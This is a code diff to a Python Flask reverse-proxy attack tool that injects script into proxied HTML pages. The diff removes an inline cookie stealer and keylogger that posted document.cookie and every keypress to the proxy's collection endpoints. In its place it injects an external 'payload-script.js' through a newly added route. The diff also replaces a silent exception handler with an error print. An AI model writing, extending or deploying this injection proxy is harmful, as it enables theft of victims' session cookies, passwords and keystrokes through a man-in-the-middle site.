@@ -199,6 +199,10 @@ def start_proxy(target, host, port, secret):
             'port': port
         })
 
+    @app.route('/payload-script.js')
+    def serve_payload():
+        return send_from_directory('proxy', 'payload-script.js', mimetype='application/javascript')
+
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
@@ -268,36 +272,14 @@ def start_proxy(target, host, port, secret):
             if 'text/html' in resp.headers.get('Content-Type', '').lower():
                 try:
                     content = content.decode()
-                    # Inject both keylogger and cookie stealer
-                    payload = '''
-                        <script src="/payload-script.js"></script>
-                        <script>
-                            // Cookie stealer
-                            setInterval(() => {
-                                fetch('/ep/api/cookies', {
-                                    method: 'POST',
-                                    headers: {'Content-Type': 'application/json'},
-                                    body: JSON.stringify({cookies: document.cookie})
-                                });
-                            }, 5000);
-
-                            // Keylogger
-                            document.addEventListener('keypress', function(e) {
-                                fetch('/ep/api/keylog', {
-                                    method: 'POST',
-                                    headers: {'Content-Type': 'application/json'},
-                                    body: JSON.stringify({key: e.key, timestamp: new Date().toISOString()})
-                                });
-                            });
-                        </script>
-                    '''
+                    payload = '<script src="/payload-script.js"></script>'
                     if '</head>' in content:
                         content = content.replace('</head>', f'{payload}</head>')
                     elif '<body>' in content:
                         content = content.replace('<body>', f'<body>{payload}')
                     content = content.encode()
-                except:
-                    pass
+                except Exception as e:
+                    print(f"{Fore.RED}[!] Error injecting payload: {str(e)}{Fore.RESET}")
 
             # Create response
             response = Response(
